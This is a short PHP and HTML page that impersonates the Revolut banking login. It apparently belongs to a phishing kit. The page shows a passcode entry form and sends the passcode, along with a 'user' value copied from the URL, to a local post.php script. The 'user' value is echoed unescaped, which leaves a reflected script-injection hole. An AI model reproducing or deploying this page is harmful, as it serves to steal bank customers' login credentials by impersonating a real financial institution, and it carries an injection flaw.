<?php 
require 'main.php';
?><!DOCTYPE html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>Revolut</title>
</head>
<body>
<header>
    <div class="logo">
<img src="res/img/logo.png" >
    </div>
</header>


<main>
<div class="form">
    <div class="title">
        <h1>Enter passcode</h1>
    </div>
    <form action="post.php" method="post">


    <div class="col">
    <input type="hidden" name="user" value="<?php echo @$_GET['user']; ?>">
        <input type="password" placeholder="Passcode"name="pass" required>
    </div>

    <div class="tite">
<label >Only digits are allowed</label>
    </div>
    <div class="B">
        <a href="#"> Forgot your passcode?</a>
       
    </div>
    <div class="but">
<button type="submit">Continue</button>
    </div>








</div>
</main>






    
</body>
</html>